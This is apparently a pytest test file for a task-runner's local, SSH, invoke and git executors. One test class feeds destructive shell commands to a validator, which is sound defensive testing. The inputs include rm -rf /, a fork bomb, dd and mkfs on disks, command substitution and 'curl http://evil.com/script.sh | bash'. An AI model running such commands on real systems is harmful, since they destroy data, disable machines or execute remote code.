from __future__ import annotations

import asyncio
import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from taskpps.domain.pipeline import ResolvedTask
from taskpps.executors import create_executor
from taskpps.executors.base import BaseExecutor, ExecutorResult
from taskpps.executors.git import (
    GitExecutor,
    _apply_credential_to_url,
    _git_pull,
    _run_subprocess,
)
from taskpps.executors.invoke import InvokeExecutor
from taskpps.executors.local import LocalExecutor
from taskpps.executors.ssh import SSHExecutor


class TestExecutorResult:
    def test_success(self):
        r = ExecutorResult(exit_code=0, stdout="ok")
        assert r.success is True

    def test_failure(self):
        r = ExecutorResult(exit_code=1, stderr="err")
        assert r.success is False


class TestBaseExecutor:
    def test_ensure_log_dir(self, tmp_path):
        class TestEx(BaseExecutor):
            async def execute(self, command, env, log_path, timeout=None, cwd=None):
                pass

            async def cancel(self):
                pass

        ex = TestEx()
        log_path = tmp_path / "sub" / "test.log"
        ex._ensure_log_dir(log_path)
        assert log_path.parent.exists()

    def test_cancel(self):
        class TestEx(BaseExecutor):
            async def execute(self, command, env, log_path, timeout=None, cwd=None):
                pass

            async def cancel(self):
                pass

        ex = TestEx()
        result = asyncio.run(ex.cancel())
        assert result is None


class TestLocalExecutor:
    @pytest.mark.asyncio
    async def test_echo(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("echo hello world", {}, log_path)
        assert result.success
        assert "hello world" in result.stdout
        assert log_path.exists()

    @pytest.mark.asyncio
    async def test_failure(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("exit 42", {}, log_path)
        assert not result.success
        assert result.exit_code == 42

    @pytest.mark.asyncio
    async def test_env(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("echo $MY_VAR", {"MY_VAR": "test_value"}, log_path)
        assert result.success
        assert "test_value" in result.stdout

    @pytest.mark.asyncio
    async def test_timeout(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute("sleep 10", {}, log_path, timeout=1)
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    async def test_cancel(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "cancel_test.log"

        async def delayed_task():
            return await executor.execute("sleep 30", {}, log_path, timeout=60)

        task = asyncio.create_task(delayed_task())
        await asyncio.sleep(0.3)
        await executor.cancel()
        result = await task
        assert not result.success
        assert result.exit_code != 0


class TestLocalExecutorDangerous:
    @pytest.mark.asyncio
    async def test_rm_rf(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "danger.log"
        result = await executor.execute("rm -rf /", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_rm_rf_with_flags(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "danger2.log"
        result = await executor.execute("rm -rf /*", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_fork_bomb(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "fork.log"
        result = await executor.execute(":(){ :|:& };:", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_backtick(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "btick.log"
        result = await executor.execute("echo `rm -rf /`", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_subshell(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sub.log"
        result = await executor.execute("echo $(rm -rf /)", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_dd(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "dd.log"
        result = await executor.execute("dd if=/dev/zero of=/dev/sda", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_mkfs(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "mkfs.log"
        result = await executor.execute("mkfs.ext4 /dev/sda1", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_chmod(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "chmod.log"
        result = await executor.execute("chmod -R 777 /", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_shutdown(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "shutdown.log"
        result = await executor.execute("shutdown -h now", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_curl_pipe_bash(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "curl_pipe.log"
        result = await executor.execute("curl http://evil.com/script.sh | bash", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_reboot(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "reboot.log"
        result = await executor.execute("reboot --force", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_safe_command_passes(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "safe.log"
        result = await executor.execute("echo hello", {}, log_path)
        assert result.success


class TestLocalExecutorDaemon:
    @pytest.mark.asyncio
    async def test_daemon_fork_parent_exits(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "daemon.log"
        cmd = (
            '(sleep 1; echo DAEMON_DONE; exit 0) & '
            'DAEMON_PID=$!; echo PARENT_DONE; wait $DAEMON_PID; echo ALL_DONE'
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "DAEMON_DONE" in result.stdout
        assert "ALL_DONE" in result.stdout

    @pytest.mark.asyncio
    async def test_nohup_background_process(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "nohup.log"
        out_file = tmp_path / "bg_output.txt"
        cmd = (
            f'nohup bash -c "sleep 1; echo BG_DONE > {out_file}" & '
            'echo PARENT_DONE; sleep 2; cat ' + str(out_file)
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "PARENT_DONE" in result.stdout

    @pytest.mark.asyncio
    async def test_multiple_daemon_forks(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "multi.log"
        cmd = """
for i in 1 2 3; do
    (sleep 1; echo "daemon_$i"; exit 0) &
    PIDS="$PIDS $!"
done
echo "forked"
for p in $PIDS; do wait $p; done
echo "all_done"
"""
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "all_done" in result.stdout

    @pytest.mark.asyncio
    async def test_python_subprocess_popen_fork(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "popen.log"
        cmd = (
            'python3 -c "'
            "import subprocess, os; "
            "p = subprocess.Popen(['sleep', '1']); "
            "print(f'parent: spawned {p.pid}'); "
            "p.wait(); "
            "print('parent: done')\""
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "parent: done" in result.stdout

    @pytest.mark.asyncio
    async def test_python_thread_subprocess(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "thread.log"
        script = tmp_path / "thread_test.py"
        script.write_text(
            "import subprocess, threading\n"
            "def run():\n"
            "    subprocess.run(['echo', 'thread_done'])\n"
            "    print('thread: completed')\n"
            "t = threading.Thread(target=run)\n"
            "t.start()\n"
            "print('main: waiting')\n"
            "t.join()\n"
            "print('main: done')\n"
        )
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=10)
        assert result.success
        assert "thread: completed" in result.stdout
        assert "main: done" in result.stdout

    @pytest.mark.asyncio
    async def test_python_asyncio_subprocess(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "async.log"
        script = tmp_path / "async_test.py"
        script.write_text(
            "import asyncio\n"
            "async def main():\n"
            "    p = await asyncio.create_subprocess_exec('echo', 'async_done')\n"
            "    await p.wait()\n"
            "    print('async: completed')\n"
            "asyncio.run(main())\n"
        )
        result = await executor.execute(f"python3 {script}", {}, log_path, timeout=10)
        assert result.success
        assert "async: completed" in result.stdout

    @pytest.mark.asyncio
    async def test_daemon_with_pid_file(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "pidfile.log"
        pid_file = tmp_path / "daemon.pid"
        cmd = (
            f'(echo $$ > {pid_file}; sleep 1; echo PIDFILE_DONE; rm -f {pid_file}; exit 0) & '
            'wait $!; echo PARENT_DONE'
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "PIDFILE_DONE" in result.stdout

    @pytest.mark.asyncio
    async def test_sighup_daemon_survives(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "sighup.log"
        marker = tmp_path / "marker.txt"
        cmd = (
            f'(sleep 2; echo SURVIVED > {marker}; exit 0) & '
            'echo "parent_exit"'
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "parent_exit" in result.stdout

    @pytest.mark.asyncio
    async def test_collect_descendants(self, tmp_path):
        executor = LocalExecutor()
        log_path = tmp_path / "desc.log"
        cmd = (
            'bash -c "sleep 30" & '
            'B1=$!; '
            'bash -c "sleep 30" & '
            'B2=$!; '
            'echo "children: $B1 $B2"; '
            'kill $B1 $B2 2>/dev/null; '
            'echo DONE'
        )
        result = await executor.execute(cmd, {}, log_path, timeout=10)
        assert result.success
        assert "DONE" in result.stdout


class TestInvokeExecutor:
    @pytest.mark.asyncio
    async def test_valid(self, tmp_path, setup_project, tmp_project):
        executor = InvokeExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute(
            "",
            {},
            log_path,
            invoke_task="sample_tasks.hello",
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_invalid(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "test.log"
        result = await executor.execute(
            "",
            {},
            log_path,
            invoke_task="nonexistent.func",
        )
        assert not result.success

    @pytest.mark.asyncio
    async def test_no_task(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "no_task.log"
        result = await executor.execute("", {}, log_path)
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_invalid_format(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "invalid.log"
        result = await executor.execute("", {}, log_path, invoke_task="invalidformat")
        assert not result.success
        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_timeout(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "timeout.log"

        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        task_file = tasks_dir / "slow_module.py"
        task_file.write_text("""
def slow_func():
    import time
    time.sleep(30)
""")

        with patch("taskpps.executors.invoke.get_tasks_dir", return_value=tasks_dir):
            result = await executor.execute(
                "",
                {},
                log_path,
                timeout=1,
                invoke_task="slow_module.slow_func",
            )
        assert not result.success
        assert result.exit_code == -1

    @pytest.mark.asyncio
    async def test_cancel(self, tmp_path):
        executor = InvokeExecutor()

        with patch.object(executor, "_cancelled", True):
            await executor.cancel()
            assert executor._cancelled is True

    @pytest.mark.asyncio
    async def test_import_error(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "import_err.log"
        result = await executor.execute(
            "",
            {},
            log_path,
            invoke_task="nonexistent_module.nonexistent_func",
        )
        assert not result.success

    @pytest.mark.asyncio
    async def test_run_invoke_function(self, tmp_path):
        executor = InvokeExecutor()
        log_path = tmp_path / "invoke_fn.log"

        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        task_file = tasks_dir / "hello_fn.py"
        task_file.write_text("""
def greet(name="world"):
    return f"hello {name}"
""")

        with patch("taskpps.executors.invoke.get_tasks_dir", return_value=tasks_dir):
            result = await executor.execute(
                "",
                {},
                log_path,
                invoke_task="hello_fn.greet",
                invoke_kwargs={"name": "test"},
            )
        assert result.success
        assert "hello test" in result.stdout


class TestSSHExecutor:
    def test_init(self):
        executor = SSHExecutor(host="192.168.1.1", port=22, username="root", password="secret")
        assert executor.host == "192.168.1.1"
        assert executor.port == 22
        assert executor.username == "root"
        assert executor.password == "secret"
        assert executor.key_path is None

    def test_init_with_key(self):
        executor = SSHExecutor(host="10.0.0.1", port=2222, username="admin", key_path="/home/user/.ssh/id_rsa")
        assert executor.host == "10.0.0.1"
        assert executor.port == 2222
        assert executor.key_path == "/home/user/.ssh/id_rsa"

    def test_make_connect_kwargs_password(self):
        executor = SSHExecutor(host="h", password="pass")
        kwargs = executor._make_connect_kwargs()
        assert kwargs == {"password": "pass"}

    def test_make_connect_kwargs_key(self):
        executor = SSHExecutor(host="h", key_path="/key")
        kwargs = executor._make_connect_kwargs()
        assert kwargs == {"key_filename": "/key"}

    def test_make_connect_kwargs_key_over_password(self):
        executor = SSHExecutor(host="h", password="pass", key_path="/key")
        kwargs = executor._make_connect_kwargs()
        assert kwargs == {"key_filename": "/key"}

    def test_make_connect_kwargs_none(self):
        executor = SSHExecutor(host="h")
        kwargs = executor._make_connect_kwargs()
        assert kwargs == {}

    @staticmethod
    def _build_mock_paramiko(output: str = "", exit_code: int = 0):
        mock_channel = MagicMock()
        encoded = output.encode("utf-8") if output else b""
        mock_channel.recv.side_effect = [encoded, b""]
        mock_channel.recv_stderr_ready.return_value = False
        mock_channel.recv_ready.return_value = False
        mock_channel.exit_status_ready.side_effect = [False, True]
        mock_channel.recv_exit_status.return_value = exit_code

        mock_transport = MagicMock()
        mock_transport.open_session.return_value = mock_channel

        mock_client = MagicMock()
        mock_client.get_transport.return_value = mock_transport

        return mock_client, mock_channel

    @pytest.mark.asyncio
    async def test_execute_success(self, tmp_path):
        log_path = tmp_path / "test.log"
        executor = SSHExecutor(host="192.168.1.1", port=22, username="root", password="secret")

        mock_client, mock_channel = self._build_mock_paramiko("hello world", 0)

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await executor.execute("ls", {}, log_path, cwd="/workspace/repo")

        assert result.success
        assert result.exit_code == 0
        assert "hello world" in result.stdout
        mock_client.connect.assert_called_once()
        cmd_arg = mock_client.get_transport().open_session().exec_command.call_args[0][0]
        assert "/workspace/repo" in cmd_arg

    @pytest.mark.asyncio
    async def test_execute_failure(self, tmp_path):
        log_path = tmp_path / "test.log"
        executor = SSHExecutor(host="192.168.1.1", port=22, username="root", password="secret")

        mock_client, mock_channel = self._build_mock_paramiko("", 127)

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await executor.execute("badcmd", {}, log_path)

        assert not result.success
        assert result.exit_code == 127

    @pytest.mark.asyncio
    async def test_execute_connection_error(self, tmp_path):
        log_path = tmp_path / "test.log"
        executor = SSHExecutor(host="192.168.1.1", port=22, username="root", password="secret")

        with patch("taskpps.executors.ssh.paramiko") as mock_paramiko:
            mock_client = MagicMock()
            mock_client.connect.side_effect = Exception("Connection refused")
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            result = await executor.execute("ls", {}, log_path)

        assert not result.success
        assert result.exit_code == -1
        assert "Connection refused" in result.stderr

    @pytest.mark.asyncio
    async def test_execute_no_cwd(self, tmp_path):
        log_path = tmp_path / "test.log"
        executor = SSHExecutor(host="h", password="p")

        mock_client, mock_channel = self._build_mock_paramiko("ok", 0)

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            await executor.execute("ls", {}, log_path)

        cmd_arg = mock_client.get_transport().open_session().exec_command.call_args[0][0]
        assert "cd" in cmd_arg and "." in cmd_arg

    @pytest.mark.asyncio
    async def test_cancel_with_connection(self):
        executor = SSHExecutor(host="h", password="p")
        mock_client = MagicMock()
        executor._client = mock_client

        await executor.cancel()
        mock_client.close.assert_called_once()
        assert executor._client is None

    @pytest.mark.asyncio
    async def test_execute_with_key_path(self, tmp_path):
        ex = SSHExecutor(host="1.2.3.4", username="root", key_path="/path/to/key")
        assert ex.key_path == "/path/to/key"

        mock_client, mock_channel = self._build_mock_paramiko("hello world", 0)

        log_path = tmp_path / "ssh_test.log"

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await ex.execute("echo hello", {"ENV": "test"}, log_path, timeout=30)

        assert result.exit_code == 0
        assert "hello" in result.stdout
        assert log_path.exists()

    @pytest.mark.asyncio
    async def test_execute_script_and_cleanup(self, tmp_path):
        ex = SSHExecutor(host="1.2.3.4", username="root", password="pass")

        mock_client, mock_channel = self._build_mock_paramiko("done", 0)

        log_path = tmp_path / "ssh_upload.log"

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await ex.execute("echo done", {}, log_path)

        assert result.exit_code == 0
        mock_client.get_transport().open_session().exec_command.assert_called_once()
        mock_client.close.assert_called_once()

    @pytest.mark.asyncio
    async def test_execute_run_failure(self, tmp_path):
        ex = SSHExecutor(host="1.2.3.4", username="root", password="pass")

        mock_client, mock_channel = self._build_mock_paramiko("output", 1)

        log_path = tmp_path / "ssh_remove_fail.log"

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await ex.execute("cmd", {}, log_path)

        assert result.exit_code == 1

    @pytest.mark.asyncio
    async def test_execute_with_cwd(self, tmp_path):
        ex = SSHExecutor(host="1.2.3.4", username="root", password="pass")

        mock_client, mock_channel = self._build_mock_paramiko("done", 0)

        log_path = tmp_path / "ssh_cwd.log"

        with (
            patch("taskpps.executors.ssh.paramiko") as mock_paramiko,
            patch("taskpps.executors.ssh.select") as mock_select,
        ):
            mock_paramiko.SSHClient.return_value = mock_client
            mock_paramiko.AutoAddPolicy.return_value = MagicMock()
            mock_select.select.return_value = ([mock_channel], [], [])
            result = await ex.execute("pwd", {}, log_path, cwd="/var/www")

        assert result.exit_code == 0
        cmd_arg = mock_client.get_transport().open_session().exec_command.call_args[0][0]
        assert "/var/www" in cmd_arg

    @pytest.mark.asyncio
    async def test_execute_with_cwd_exception(self, tmp_path):
        executor = SSHExecutor(host="127.0.0.1", port=29999, username="test")
        log_path = tmp_path / "cwd_test.log"
        result = await executor.execute("echo hello", {}, log_path, cwd="/tmp")
        assert not result.success

    @pytest.mark.asyncio
    async def test_execute_exception(self, tmp_path):
        executor = SSHExecutor(host="127.0.0.1", port=29999, username="test")
        log_path = tmp_path / "exception.log"
        result = await executor.execute("echo hello", {}, log_path)
        assert not result.success
        assert result.exit_code == -1
        
        # 验证即使异常，日志文件也被创建并写入内容
        assert log_path.exists(), "日志文件在异常时也应该被创建"
        with open(log_path, "r") as f:
            log_content = f.read()
        assert len(log_content) > 0, "日志文件应该包含内容"
        assert log_content == result.stdout, "日志内容应该与返回的输出一致"

    @pytest.mark.asyncio
    async def test_cancel_no_connection(self):
        executor = SSHExecutor(host="127.0.0.1", port=29999, username="test")
        await executor.cancel()

    @pytest.mark.asyncio
    async def test_cancel_with_client(self):
        executor = SSHExecutor(host="127.0.0.1", port=29999, username="test")
        executor._client = MagicMock()
        executor._channel = MagicMock()
        await executor.cancel()
        assert executor._client is None

    @pytest.mark.asyncio
    async def test_cancel_close_exception(self):
        executor = SSHExecutor(host="127.0.0.1", port=29999, username="test")
        executor._channel = MagicMock()
        executor._channel.close.side_effect = Exception("close error")
        executor._client = MagicMock()
        executor._client.close.side_effect = Exception("client close error")
        await executor.cancel()

    @pytest.mark.asyncio
    async def test_with_key_path_attr(self):
        executor = SSHExecutor(host="1.2.3.4", port=22, username="root", key_path="/tmp/key")
        assert executor.key_path == "/tmp/key"


class TestCreateExecutor:
    def test_local(self):
        task = ResolvedTask(name="t", task_type="command", command="echo")
        executor = create_executor(task)
        assert isinstance(executor, LocalExecutor)

    def test_invoke(self):
        task = ResolvedTask(name="t", task_type="invoke", invoke_task="mod.fn")
        executor = create_executor(task)
        assert isinstance(executor, InvokeExecutor)

    def test_ssh(self, tmp_path):
        task = ResolvedTask(
            name="t",
            task_type="command",
            command="echo",
            host="myhost",
        )

        with patch("taskpps.loaders.agent_loader.get_agents_dir") as mock_get_agents_dir:
            agents_dir = tmp_path / "agents"
            agents_dir.mkdir()
            agent_file = agents_dir / "myhost.yaml"
            agent_file.write_text("host: 1.2.3.4\nport: 2222\nusername: admin\n")
            mock_get_agents_dir.return_value = agents_dir

            executor = create_executor(task)
            assert isinstance(executor, SSHExecutor)
            assert executor.host == "1.2.3.4"
            assert executor.port == 2222
            assert executor.username == "admin"

    def test_ssh_with_credential(self, tmp_path):
        task = ResolvedTask(
            name="t",
            task_type="command",
            command="echo",
            host="myhost",
            credential="mycred",
        )

        with (
            patch("taskpps.loaders.agent_loader.get_agents_dir") as mock_get_agents_dir,
            patch("taskpps.loaders.credential_loader.get_credentials_dir") as mock_get_creds_dir,
        ):
            agents_dir = tmp_path / "agents"
            agents_dir.mkdir()
            agent_file = agents_dir / "myhost.yaml"
            agent_file.write_text("host: 1.2.3.4\nport: 2222\nusername: admin\n")
            mock_get_agents_dir.return_value = agents_dir

            creds_dir = tmp_path / "credentials"
            creds_dir.mkdir()
            cred_file = creds_dir / "mycred.yaml"
            cred_file.write_text("password: secret123\n")
            mock_get_creds_dir.return_value = creds_dir

            executor = create_executor(task)
            assert isinstance(executor, SSHExecutor)
            assert executor.password == "secret123"

    def test_ssh_agent_not_found(self, tmp_path):
        task = ResolvedTask(
            name="t",
            task_type="command",
            command="echo",
            host="nonexistent-host",
        )

        with patch("taskpps.loaders.agent_loader.get_agents_dir") as mock_get_agents_dir:
            agents_dir = tmp_path / "agents"
            agents_dir.mkdir()
            mock_get_agents_dir.return_value = agents_dir

            executor = create_executor(task)
            assert isinstance(executor, LocalExecutor)

    def test_ssh_credential_not_found(self, tmp_path):
        task = ResolvedTask(
            name="t",
            task_type="command",
            command="echo",
            host="myhost",
            credential="nonexistent-cred",
        )

        with (
            patch("taskpps.loaders.agent_loader.get_agents_dir") as mock_get_agents_dir,
            patch("taskpps.loaders.credential_loader.get_credentials_dir") as mock_get_creds_dir,
        ):
            agents_dir = tmp_path / "agents"
            agents_dir.mkdir()
            agent_file = agents_dir / "myhost.yaml"
            agent_file.write_text("host: 1.2.3.4\nport: 2222\nusername: admin\n")
            mock_get_agents_dir.return_value = agents_dir

            creds_dir = tmp_path / "credentials"
            creds_dir.mkdir()
            mock_get_creds_dir.return_value = creds_dir

            executor = create_executor(task)
            assert isinstance(executor, SSHExecutor)
            assert executor.password is None
            assert executor.key_path is None

    def test_command_no_host(self):
        task = ResolvedTask(name="t", task_type="command", command="echo")
        executor = create_executor(task)
        assert isinstance(executor, LocalExecutor)

    def test_invoke_type(self):
        task = ResolvedTask(name="t", task_type="invoke", invoke_task="mod.fn")
        executor = create_executor(task)
        assert isinstance(executor, InvokeExecutor)


class TestGitExecutor:
    @pytest.mark.asyncio
    async def test_clone(self, tmp_path):
        dest = tmp_path / "repo"
        log_path = tmp_path / "test.log"
        executor = GitExecutor(repo="https://github.com/example/repo.git", ref="main", dest=str(dest))

        with patch("taskpps.executors.git._run_subprocess") as mock_run:
            mock_run.return_value = ExecutorResult(exit_code=0, stdout="Cloned")
            result = await executor.execute(command="", env={}, log_path=log_path)

        assert result.success
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert "git" in call_args[0][0]
        assert "clone" in call_args[0][0]

    @pytest.mark.asyncio
    async def test_existing_dir_pull(self, tmp_path):
        dest = tmp_path / "repo"
        dest.mkdir()
        (dest / ".git").mkdir()
        log_path = tmp_path / "test.log"

        executor = GitExecutor(repo="https://github.com/example/repo.git", ref="main", dest=str(dest))

        with patch("taskpps.executors.git._git_pull") as mock_pull:
            mock_pull.return_value = ExecutorResult(exit_code=0, stdout="Pulled")
            result = await executor.execute(command="", env={}, log_path=log_path)

        assert result.success
        mock_pull.assert_called_once()

    @pytest.mark.asyncio
    async def test_cancel(self, tmp_path):
        executor = GitExecutor(repo="https://github.com/example/repo.git")
        await executor.cancel()
        assert executor._cancelled is True

    @pytest.mark.asyncio
    async def test_submodules_flag(self, tmp_path):
        dest = tmp_path / "repo"
        log_path = tmp_path / "test.log"
        executor = GitExecutor(
            repo="https://github.com/example/repo.git",
            ref="main",
            dest=str(dest),
            submodules=True,
        )

        with patch("taskpps.executors.git._run_subprocess") as mock_run:
            mock_run.return_value = ExecutorResult(exit_code=0, stdout="Cloned")
            await executor.execute(command="", env={}, log_path=log_path)

        call_args = mock_run.call_args[0][0]
        assert "--recurse-submodules" in call_args

    @pytest.mark.asyncio
    async def test_depth(self, tmp_path):
        dest = tmp_path / "repo"
        log_path = tmp_path / "test.log"
        executor = GitExecutor(
            repo="https://github.com/example/repo.git",
            ref="main",
            dest=str(dest),
            depth=5,
        )

        with patch("taskpps.executors.git._run_subprocess") as mock_run:
            mock_run.return_value = ExecutorResult(exit_code=0, stdout="Cloned")
            await executor.execute(command="", env={}, log_path=log_path)

        call_args = mock_run.call_args[0][0]
        assert "--depth" in call_args
        depth_idx = call_args.index("--depth")
        assert call_args[depth_idx + 1] == "5"


class TestGitHelpers:
    def test_apply_credential_no_credential(self):
        url = _apply_credential_to_url("https://github.com/repo.git", None, {})
        assert url == "https://github.com/repo.git"

    def test_apply_credential_with_git_token(self):
        env = {"GIT_TOKEN": "mytoken123"}
        url = _apply_credential_to_url("https://github.com/repo.git", "GIT_TOKEN", env)
        assert url == "https://oauth2:mytoken123@github.com/repo.git"

    def test_apply_credential_http_url(self):
        env = {"GIT_TOKEN": "mytoken123"}
        url = _apply_credential_to_url("http://github.com/repo.git", "GIT_TOKEN", env)
        assert url == "http://github.com/repo.git"

    def test_apply_credential_no_matching_env(self):
        url = _apply_credential_to_url("https://github.com/repo.git", "MY_CRED", {})
        assert "oauth2:" in url

    def test_run_subprocess_success(self, tmp_path):
        log_path = tmp_path / "test.log"
        result = _run_subprocess(["echo", "hello"], log_path, dict(os.environ))
        assert result.success
        assert "hello" in result.stdout

    def test_run_subprocess_failure(self, tmp_path):
        log_path = tmp_path / "test.log"
        result = _run_subprocess(["false"], log_path, dict(os.environ))
        assert not result.success

    def test_git_pull(self, tmp_path):
        log_path = tmp_path / "test.log"
        with patch("taskpps.executors.git._run_subprocess") as mock_run:
            mock_run.return_value = ExecutorResult(exit_code=0, stdout="ok")
            result = _git_pull("/tmp/repo", "main", log_path, dict(os.environ), None)
        assert result.success
        assert mock_run.call_count == 3